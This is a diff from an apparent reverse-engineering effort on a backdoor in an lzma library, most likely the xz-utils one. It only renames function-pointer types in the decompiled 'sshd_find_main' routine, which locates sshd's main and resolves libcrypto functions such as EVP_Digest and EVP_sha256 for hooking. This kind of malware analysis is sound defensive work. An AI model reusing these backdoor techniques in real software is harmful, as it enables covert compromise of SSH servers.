@@ -23,7 +23,7 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
   BOOL BVar3;
   lzma_allocator *allocator_00;
   u8 *puVar4;
-  _func_40 *p_Var5;
+  pfn_EVP_PKEY_new_raw_public_key_t ppVar5;
   u8 *puVar6;
   Elf64_Sym *pEVar7;
   u8 *puVar8;
@@ -49,9 +49,9 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
   puVar4 = (u8 *)elf_get_code_segment(sshd,&local_88);
   if (puVar4 != (u8 *)0x0) {
     puVar12 = puVar4 + local_88;
-    p_Var5 = (_func_40 *)lzma_alloc(0x758,allocator_00);
-    imported_funcs->EVP_PKEY_new_raw_public_key = p_Var5;
-    if (p_Var5 != (_func_40 *)0x0) {
+    ppVar5 = (pfn_EVP_PKEY_new_raw_public_key_t)lzma_alloc(0x758,allocator_00);
+    imported_funcs->EVP_PKEY_new_raw_public_key = ppVar5;
+    if (ppVar5 != (pfn_EVP_PKEY_new_raw_public_key_t)0x0) {
       imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
     }
     puVar6 = (u8 *)elf_get_got_symbol(sshd,STR_libc_start_main);
@@ -73,7 +73,7 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
         EVar1 = pEVar7->st_value;
         pEVar2 = libcrypto->elfbase;
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
-        imported_funcs->EVP_Digest = (_func_56 *)(pEVar2->e_ident + EVar1);
+        imported_funcs->EVP_Digest = (pfn_EVP_Digest_t)(pEVar2->e_ident + EVar1);
       }
       puVar11 = (u8 *)0x0;
       while (code_start < code_end) {
@@ -98,7 +98,7 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
             pEVar7 = elf_symbol_get(libcrypto,STR_EVP_sha256,0);
             if (pEVar7 != (Elf64_Sym *)0x0) {
               imported_funcs->EVP_sha256 =
-                   (_func_38 *)(libcrypto->elfbase->e_ident + pEVar7->st_value);
+                   (pfn_EVP_sha256_t)(libcrypto->elfbase->e_ident + pEVar7->st_value);
               imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
             }
             *code_start_out = puVar11;
